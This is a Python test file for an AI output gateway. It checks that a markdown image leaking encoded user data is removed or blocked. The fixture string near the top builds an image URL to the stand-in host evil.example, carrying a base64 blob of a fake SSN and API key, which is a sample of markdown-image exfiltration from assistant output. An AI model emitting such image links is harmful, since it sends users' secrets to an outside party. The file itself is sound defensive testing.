# ruff: noqa: E501  (GW33 test file: long assertion/docstring lines kept readable)
"""LGW33-1 (offline equivalent, not the live gate): a markdown image whose URL carries encoded data
is defanged or blocked and never delivered. Every action; both modes where the mode can hold."""
from __future__ import annotations

import base64
import random

import pytest

from gateway_v2.domain import Action, Category, StreamingMode
from tests.e2e.gw33_support import plan_of, rule, run, split

_DATA = base64.urlsafe_b64encode(b"user=alice;ssn=123-45-6789;api_key=sk-secret-value-123").decode()
_TEXT = f"Here is the summary you asked for. ![chart](https://evil.example/log.png?d={_DATA}) Done."
_URL_BITS = ("evil.example", _DATA, "log.png")


def _plan(mode: StreamingMode, action: Action, allow: tuple[str, ...] = ()):  # type: ignore[no-untyped-def]
    return plan_of(mode, rule("out_exfil", Category.EXFIL, action, "output.exfil",
                              template="[external image removed]", allow_hosts=allow))


@pytest.mark.parametrize("action", [Action.REDACT, Action.REWRITE])
def test_strict_withhold_defangs_with_redact_and_rewrite(action: Action) -> None:
    rng = random.Random(33_201)
    for _ in range(60):
        result = run(_plan(StreamingMode.STRICT_WITHHOLD, action), split(_TEXT, rng))
        assert not any(bit in result.released for bit in _URL_BITS)
        assert result.released.startswith("Here is the summary you asked for. ")
        assert result.released.endswith(" Done.") and result.codes == []
        expected = "[external image removed]" if action is Action.REWRITE else "[REDACTED]"
        assert expected in result.released


def test_strict_withhold_block_delivers_nothing() -> None:
    rng = random.Random(33_202)
    for _ in range(60):
        result = run(_plan(StreamingMode.STRICT_WITHHOLD, Action.BLOCK), split(_TEXT, rng))
        assert result.released == "" and result.codes == ["output_blocked"]


def test_the_default_action_for_an_enabled_org_is_block_and_a_logo_on_the_allow_list_passes() -> None:
    logo = "Our logo: ![l](https://cdn.example.com/assets/logo.png) ok"
    plan = _plan(StreamingMode.STRICT_WITHHOLD, Action.BLOCK, allow=("cdn.example.com",))
    assert run(plan, [("output_content", logo)]).released == logo
    assert run(plan, [("output_content", _TEXT)]).released == ""


def test_incremental_exfil_is_flag_only_at_final_and_never_held() -> None:
    """D-9: exfil cannot be held in INCREMENTAL; the honest behaviour is a reported flag."""
    rng = random.Random(33_203)
    plan = _plan(StreamingMode.INCREMENTAL, Action.FLAG)
    result = run(plan, split(_TEXT, rng))
    assert result.released == _TEXT and result.codes == []
    assert result.stats.review_required is True  # type: ignore[attr-defined]
